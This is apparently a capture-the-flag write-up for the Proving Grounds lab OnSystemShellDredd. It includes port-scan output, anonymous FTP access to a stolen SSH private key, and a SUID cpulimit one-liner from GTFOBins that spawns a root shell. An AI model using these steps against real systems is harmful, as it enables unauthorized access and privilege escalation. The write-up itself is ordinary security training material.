* * *
 ### LAB: OnSystemShellDredd 
 ### PLATFORM: PG
* * *

### ENUMERATION

- Rustscan's scan result shows ftp running on port 21 and ssh running on port 61000.

        .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 192.168.178.130:21
      Open 192.168.178.130:61000
      
      PORT      STATE SERVICE REASON  VERSION
      21/tcp    open  ftp     syn-ack vsftpd 3.0.3
      |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
      | ftp-syst: 
      |   STAT: 
      | FTP server status:
      |      Connected to ::ffff:192.168.45.174
      |      Logged in as ftp
      |      TYPE: ASCII
      |      No session bandwidth limit
      |      Session timeout in seconds is 300
      |      Control connection is plain text
      |      Data connections will be plain text
      |      At session startup, client count was 5
      |      vsFTPd 3.0.3 - secure, fast, stable
      |_End of status
      61000/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
      | ssh-hostkey: 
      |   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiOZxbr74TmNuWOBDmPInK6nZnRGfOMtZMJDBErXIPCZR9kdZDqJbkdRlnP8QLGuTl/t8qPgP863Rl1yfJLSv995PQ+oUZTSa21cGulVCtFFCKedJJJF9p2cAyYzjeA9qg1Ja7dOPtyPsSCplYzZcILwXZ52mg1k8VH2HUZ7DO0wMBYWONhkXWRR49gMN+IKge3DXNrfyHtnjMVWTwEtfqjFd+D70qi7UusZyfP2MogDX7LgRWC9RmvS6o8KxYW4psLWDB2dp/Nf3FitenY0UMPKkHrxxjeqfYZhFwENmHAsxzrHJo1acSrNMUbTdWuLzcLHQgMIYMUlmGvDkg31c/
      |   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNXNPAPJkUYF4+uu955+0RpMZKriG9olCwtkPB3j5XbiiB+B7WEVv331ittcLxibSBWqV2OO328ThebB2YF9qvI=
      |   256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP5tk066endR9DMYxXzxhixx6c8cQ0HjGvYbtL8Lgv91
      Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

- Anonymous login is enabled on ftp which means we can login with creds `anonymous:password`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/2ca1f14a-860f-4dbc-b120-fb403a7376de)

- The ftp server contains a hidden directory with a ssh private key in it. I used `get <filename>` to download the file from the ftp server

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/ff4f7e9f-d4e5-403a-bd2a-5420bd04a93f)

- We can login with a private with `chmod 600 <private_key>;ssh -i <private key> <user>@host`.Ssh access gained

 ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/44be0f79-e5b5-4102-893b-86e11be09455)

  
 ### PRIVILEGE ESCALATION

- After running `find / -perm -u=s 2</dev/null`,I discovered that a binary cpulimit has a suid bit

   ![Uploading image.png…]()


- I got this one liner from gtfobins to escalate privileges

      cpulimit -l 100 -f -- /bin/sh -p

- Root access!!!!

  
